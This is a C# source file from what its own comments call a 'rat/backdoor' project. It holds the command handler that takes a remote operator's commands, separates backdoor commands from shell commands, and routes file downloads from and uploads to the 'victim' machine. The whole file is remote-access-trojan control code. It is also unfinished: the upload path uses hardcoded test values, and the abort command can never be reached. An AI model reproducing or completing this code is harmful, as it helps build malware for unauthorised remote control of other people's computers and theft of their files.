using RAT.src.Interfaces;
using RAT.src.Models.Enums;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace RAT.src.Logic.RatCommands
{
    /// <summary>
    /// Our rat/backdoor commands handling logic.
    /// </summary>
    public class RatCommandLogic : IRatCommandLogic
    {
        private ISocketStateLogic _stateLogic;
        private IClientNotificationLogic _notificationLogic;
        private IFileDownloader _fileDownloader;
        private IFileUploader _fileUploader;

        /// <summary>
        /// Currently available commands for our rat/backdoor.
        /// </summary>
        private List<string> _ratCommands = new List<string>()
            { "upload file -p", "download file -p" };

        /// <summary>
        /// Our command identifier, if this is found in our string command during receival as first word - then client wants
        /// to execute rat command, not shell command.
        /// </summary>
        private const string _ratCommandIdentifier = "RAT";

        /// <summary>
        /// Our rat/backdoor commands handling logic.
        /// </summary>
        /// <param name="stateLogic">Logic for our client state.</param>
        /// <param name="notificationLogic">Logic client notification.</param>
        /// <param name="fileDownloader">Logic for file download (to client).</param>
        /// <param name="fileUploader">Logic for file upload (to victim).</param>
        public RatCommandLogic(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic,
            IFileDownloader fileDownloader,
            IFileUploader fileUploader)
        {
            _stateLogic = stateLogic;
            _fileDownloader = fileDownloader;
            _notificationLogic = notificationLogic;
            _fileUploader = fileUploader;
        }

        /// <summary>
        /// Determines if first word of string is command for rat.
        /// </summary>
        /// <param name="command">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
        /// <returns>True if command is rat command, false is something else.</returns>
        public bool IsRatCommand(string command)
        {
            // Check if first word of string is our command identifier.
            return Regex.Replace(command.Split()[0], @"[^0-9a-zA-Z\ ]+", "") == _ratCommandIdentifier;
        }

        /// <summary>
        /// Handles rat command that clien wants to execute.
        /// </summary>
        /// <param name="command">Command to handle (such as file upload, download, etc)./param>
        public void HandleRatCommand(string command)
        {
            var clientState = _stateLogic.State;
            var formattedCommand = this.FormatCommand(command);

            // Here goes custom command interpreter, not using any libs for argument handling.
            if (!this.IsValidRatCommand(formattedCommand))
            {
                _notificationLogic.NotifyClient($"\"{formattedCommand}\" is unrecognized RAT command\n");
                return;
            }

            /////// -------- CAN BE REFACTORED LIKE COMMAND/QUERY WITH "ABORT" FUNCTIONALITY
            var words = formattedCommand.Split();
            string cleanCommand = words[1] + ' ' + words[2];
            if (cleanCommand == "download file") // CAN BE MOVED TO ENUM
            {
                int indexOfPath = formattedCommand.IndexOf(" -p ");
                if (indexOfPath == -1)
                {
                    _notificationLogic.NotifyClient($"\"-p\" (path) argument not found for RAT\n");
                    return;
                }

                _fileDownloader.DownloadFile(formattedCommand.Substring(indexOfPath + " -p ".Length).Trim());
            }
            else if (cleanCommand == "upload file") // CAN BE MOVED TO ENUM
            {
                //int indexOfPath = formattedCommand.IndexOf(" -p ");
                //if (indexOfPath == -1)
                //{
                //    _notificationLogic.NotifyClient($"\n\"-p\" (path) argument not found for RAT\n");
                //    return;
                //}

                //int indexOfFileSize = formattedCommand.IndexOf(" -s ");
                //if (indexOfFileSize == -1)
                //{
                //    _notificationLogic.NotifyClient($"\n\"-s\" (file size) argument not found for RAT\n");
                //    return;
                //}

                //string filePath = formattedCommand.Substring(indexOfPath + " -p ".Length).Trim();
                //string fileSizeInStringFormat = formattedCommand.Substring(indexOfPath + " -s ".Length).Trim();

                //int fileSize = 0;
                //try
                //{
                //    fileSize = Convert.ToInt32(fileSizeInStringFormat);
                //}
                //catch (Exception exception)
                //{
                //    _notificationLogic.NotifyClient($"\nError: {exception.Message}\n{fileSizeInStringFormat} is bad number\n");
                //    return;
                //}

                string filePath = "somepath"; // TEST, REMOVE
                int fileSize = 4096; // TEST, REMOVE
                _fileUploader.PrepareForFileUpload(filePath, fileSize);
            }
            /////// -------- CAN BE REFACTORED LIKE COMMAND/QUERY WITH "ABORT" FUNCTIONALITY
            else if (cleanCommand == "abort operation") // CAN BE MOVED TO ENUM
            {
                _stateLogic.State.CurrentOperation = CurrentOperation.None;
                _notificationLogic.NotifyClient($"\nFile upload aborted\n");
            }
        }

        /// <summary>
        /// Formats command for interpreter.
        /// </summary>
        /// <param name="command">Command to format.</param>
        /// <returns>Formatted command.</returns>
        private string FormatCommand(string command)
        {
            // Get rid of \n in the end of command.
            return command.Substring(0, command.LastIndexOf("\n"));
        }

        /// <summary>
        /// Determines if command is valid to be executed/interpreted by program.
        /// </summary>
        /// <param name="clientCommand">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
        /// <returns>True if is valid command, false otherwise.</returns>
        private bool IsValidRatCommand(string clientCommand)
        {
            return this.IsRatCommand(clientCommand)
                && _ratCommands.Any(validCommand => clientCommand.Contains(validCommand));
        }
    }
}